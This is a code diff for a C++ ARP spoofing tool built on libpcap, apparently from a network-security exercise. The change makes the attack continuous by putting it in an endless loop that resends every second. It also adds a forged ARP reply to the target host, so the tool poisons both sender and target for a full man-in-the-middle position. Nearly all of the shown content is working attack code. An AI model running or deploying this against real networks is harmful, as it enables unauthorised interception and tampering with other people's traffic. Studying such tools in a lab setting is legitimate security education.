@@ -1,3 +1,5 @@
+#include <unistd.h>
+
 #include <regex.h>
 #include <sys/types.h>
 
@@ -34,6 +36,7 @@ void sendARPRequest(pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip
 void sendARPReply(pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
 void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP,MyAddr attacker);
 
+
 int main(int argc, char* argv[]) {
 
     if( argc < 4 || argc % 2 !=0 )
@@ -58,9 +61,13 @@ int main(int argc, char* argv[]) {
         return -1;
     }
 
-    for(i=0;i<attackCase;i++)
+    while (1)
     {
-        arpSpoofing(handle, argv[2+i], argv[3+i],attacker);
+        for(i=0;i<attackCase;i++)
+        {
+            arpSpoofing(handle, argv[2+i], argv[3+i],attacker);
+        }
+        sleep(1);
     }
 
     pcap_close(handle);
@@ -169,26 +176,14 @@ void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP, MyAddr attacker)
 {
     Ip sIP = Ip(sendIP);
     Ip tIP = Ip(targetIP);
-    Ip rIP;
 
-    //0. get MAC addr
     sendARPRequest(handle,attacker.mac_,Mac::broadcastMac(),attacker.mac_,attacker.ip_,Mac::nullMac(),tIP);
     Mac tMAC = getMACAddr(handle, tIP);
     sendARPRequest(handle,attacker.mac_,Mac::broadcastMac(),attacker.mac_,attacker.ip_,Mac::nullMac(),sIP);
     Mac sMAC = getMACAddr(handle, sIP);
 
-//    //1. sender PC request
-//    sendARPRequest(handle, sMAC,Mac::broadcastMac(),sMAC,sIP,Mac::nullMac(),tIP);
-
-//    //2. target PC reply
-//    sendARPReply(handle,tMAC,sMAC,tMAC,tIP,sMAC,sIP);
-
-    //3. attacker PC reply
     sendARPReply(handle,attacker.mac_,sMAC,attacker.mac_,tIP,sMAC,sIP);
-
-//    //4. attacker PC request
-//    sendARPRequest(handle,attacker.mac_,sMAC,attacker.mac_,tIP,Mac::nullMac(),rIP);
-
+    sendARPReply(handle,attacker.mac_,tMAC,attacker.mac_,sIP,tMAC,tIP);
 }
 
 void sendARPRequest(pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip)
